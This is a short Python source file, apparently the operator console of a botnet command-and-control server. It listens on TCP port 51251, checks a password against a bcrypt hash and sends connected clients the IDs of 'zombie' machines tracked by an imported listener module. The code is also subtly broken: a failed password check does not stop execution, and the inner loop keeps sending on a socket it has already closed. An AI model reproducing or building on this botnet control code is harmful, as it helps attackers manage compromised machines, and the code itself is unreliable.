import time
import socket
import listener
import bcrypt



def start():
	# bcrypt password hash
	hash = b'$2b$12$5f2z5D3nmeGV0bVOKmJlXuM0ncQXHu9IokJWe/XZZEVc4cxUV3sZS'
	#hash = b'$2b$12$ai/fCX5Y3t9TxXTRyke7GOGAZvKs2yyh4hBxuMkPji9s.zM0Me/jG'
	# create an INET, STREAMing socket
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# bind the socket to a public host, and a well-known port
	serversocket.bind((socket.gethostname(), 51251))
	# become a server socket
	serversocket.listen(5)
	
	

	while True:
		(clientsocket, address) = serversocket.accept()
		clientsocket.send(b'Please enter password: ')
		password = clientsocket.recv(2048)
		if not bcrypt.checkpw(password, hash):
			clientsocket.close()
		while True:
			# Print active zombie IDs
			for z in listener.zombies:
				clientsocket.send(z.id.encode())
			# Exit
			clientsocket.close()
